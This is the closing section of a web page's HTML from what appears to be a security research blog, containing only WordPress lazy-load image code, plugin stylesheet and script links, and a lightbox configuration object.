                if ( ! 'imgSrc' in img.dataset || ! img.dataset.imgSrc )
                    return;

                img.src = img.dataset.imgSrc;

                if ( 'imgSrcset' in img.dataset ) {
                    img.srcset = img.dataset.imgSrcset;
                    img.removeAttribute('data-img-srcset');
                }

                img.classList.remove('wpp-lazyload');
                img.removeAttribute('data-img-src');
                img.classList.add('wpp-lazyloaded');
            }

            function wpp_observe_imgs(){
                let wpp_images = document.querySelectorAll('img.wpp-lazyload'),
                    wpp_widgets = document.querySelectorAll('.popular-posts-sr');

                if ( wpp_images.length || wpp_widgets.length ) {
                    if ( 'IntersectionObserver' in window ) {
                        WPPImageObserver = new IntersectionObserver(function(entries, observer) {
                            entries.forEach(function(entry) {
                                if (entry.isIntersecting) {
                                    let img = entry.target;
                                    wpp_load_img(img);
                                    WPPImageObserver.unobserve(img);
                                }
                            });
                        });

                        if ( wpp_images.length ) {
                            wpp_images.forEach(function(image) {
                                WPPImageObserver.observe(image);
                            });
                        }

                        if ( wpp_widgets.length ) {
                            for (var i = 0; i < wpp_widgets.length; i++) {
                                let wpp_widget_images = wpp_widgets[i].querySelectorAll('img.wpp-lazyload');

                                if ( ! wpp_widget_images.length && wpp_widgets[i].shadowRoot ) {
                                    wpp_widget_images = wpp_widgets[i].shadowRoot.querySelectorAll('img.wpp-lazyload');
                                }

                                if ( wpp_widget_images.length ) {
                                    wpp_widget_images.forEach(function(image) {
                                        WPPImageObserver.observe(image);
                                    });
                                }
                            }
                        }
                    } /** Fallback for older browsers */
                    else {
                        if ( wpp_images.length ) {
                            for (var i = 0; i < wpp_images.length; i++) {
                                wpp_load_img(wpp_images[i]);
                                wpp_images[i].classList.remove('wpp-lazyloaded');
                            }
                        }

                        if ( wpp_widgets.length ) {
                            for (var j = 0; j < wpp_widgets.length; j++) {
                                let wpp_widget = wpp_widgets[j],
                                    wpp_widget_images = wpp_widget.querySelectorAll('img.wpp-lazyload');

                                if ( ! wpp_widget_images.length && wpp_widget.shadowRoot ) {
                                    wpp_widget_images = wpp_widget.shadowRoot.querySelectorAll('img.wpp-lazyload');
                                }

                                if ( wpp_widget_images.length ) {
                                    for (var k = 0; k < wpp_widget_images.length; k++) {
                                        wpp_load_img(wpp_widget_images[k]);
                                        wpp_widget_images[k].classList.remove('wpp-lazyloaded');
                                    }
                                }
                            }
                        }
                    }
                }
            }

            document.addEventListener('DOMContentLoaded', function() {
                wpp_observe_imgs();

                // When an ajaxified WPP widget loads,
                // Lazy load its images
                document.addEventListener('wpp-onload', function(){
                    wpp_observe_imgs();
                });
            });
        </script>
        <link rel='stylesheet' id='wpdevart_lightbox_front_end_css-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/lightbox-popup/includes/style/wpdevart_lightbox_front.css?ver=5.4.1' type='text/css' media='all' />
<link rel='stylesheet' id='wpdevart_lightbox_effects-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/lightbox-popup/includes/style/effects_lightbox.css?ver=5.4.1' type='text/css' media='all' />
<script type='text/javascript' src='https://www.google.com/recaptcha/api.js'></script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/dist/scripts/main.js'></script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-includes/js/wp-embed.min.js?ver=5.4.1'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var wpdevart_lb_variables = {"eneble_lightbox_content":"enable","overlay_transparency_prancent":"80","popup_background_color":"#000000","popup_loading_image":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/popup_loading.png","popup_initial_width":"350","popup_initial_height":"300","popup_youtube_width":"640","popup_youtube_height":"410","popup_vimeo_width":"500","popup_vimeo_height":"410","popup_max_width":"5000","popup_max_height":"5000","popup_position":"5","popup_fixed_position":"true","popup_outside_margin":"0","popup_border_width":"2","popup_border_color":"#000000","popup_border_radius":"10","control_buttons_show":"true","control_buttons_show_in_content":"false","control_buttons_height":"30","control_buttons_line_bg_color":"#000000","control_button_prev_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/prev.png","control_button_prev_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/prev_hover.png","control_button_next_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/next.png","control_button_next_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/next_hover.png","control_button_download_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/download.png","control_button_download_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/download_hover.png","control_button_innewwindow_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/innewwindow.png","control_button_innewwindow_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/innewwindow_hover.png","control_button_fullwidth_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/fullwidth.png","control_button_fullwidht_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/fullwidth_hover.png","control_button_fullwidthrest_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/fullwidthreset.png","control_button_fullwidhtrest_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/fullwidthreset_hover.png","control_button_close_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/close.png","control_button_close_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/close_hover.png","information_panel_show":"false","information_panel_show_in_content":"false","information_panel_bg_color":"#000000","information_panel_default_transparency":"100","information_panel_hover_trancparency":"100","information_panel_count_image_after_text":"Image","information_panel_count_image_middle_text":"of","information_panel_count_padding_left":"15","information_panel_count_padding_right":"4","information_panel_count_font_size":"20","information_panel_desc_padding_left":"15","information_panel_desc_padding_right":"4","information_panel_desc_font_size":"20","information_panel_desc_show_if_not":"true","information_panel_text_for_no_caption":"No Caption","information_panel_title_padding_left":"5","information_panel_title_padding_right":"5","information_panel_title_font_size":"15","information_panel_title_show_if_not":"true","information_panel_text_for_no_title":"No Title","information_panel_ordering":"{\"count\":[1,\"count\"],\"title\":[0,\"title\"],\"caption\":[0,\"caption\"]}"};
/* ]]> */
</script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/plugins/lightbox-popup/includes/javascript/wpdevart_lightbox_front.js?ver=1.0'></script>
          
  </body>
</html>
